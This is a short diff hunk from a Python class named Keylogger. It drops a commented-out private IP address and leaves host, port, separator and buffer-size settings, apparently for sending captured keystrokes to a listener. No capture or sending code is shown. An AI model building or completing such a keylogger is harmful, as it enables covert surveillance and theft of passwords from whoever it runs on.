@@ -20,7 +20,6 @@ class Keylogger:
         self.end_time = datetime.now()
         self.seperator = "<SEPARATOR>"
         self.buffer_size = 4096
-        #self.host = "10.159.13.240" CHANGE
         self.host = "127.0.0.1"
         self.port = 5001
 
